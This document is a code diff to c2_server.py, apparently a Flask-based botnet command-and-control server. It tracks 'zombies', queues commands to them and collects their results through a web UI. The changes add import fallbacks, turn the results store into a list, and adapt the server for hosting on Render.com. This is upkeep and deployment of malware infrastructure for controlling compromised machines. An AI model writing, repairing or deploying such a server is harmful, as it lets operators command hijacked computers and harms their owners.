@@ -1,5 +1,17 @@
 # c2_server.py
-from flask import Flask, render_template_string, request, jsonify
+import sys
+try:
+    from flask import Flask, render_template_string, request, jsonify
+except ImportError as e:
+    print("Flask missing – run: pip install -r requirements.txt")
+    sys.exit(1)
+
+# Werkzeug compatibility shim
+try:
+    from werkzeug.urls import url_quote
+except ImportError:
+    from werkzeug.utils import quote as url_quote
+
 import json
 import time
 import threading
@@ -10,7 +22,7 @@ app = Flask(__name__)
 # In-memory zombie database
 zombies = {}
 command_queue = {}
-command_results = {}
+command_results = []
 
 HTML_UI = '''
 <!DOCTYPE html>
@@ -141,4 +153,6 @@ def results():
     return jsonify(command_results)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    # Render.com uses PORT env var
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
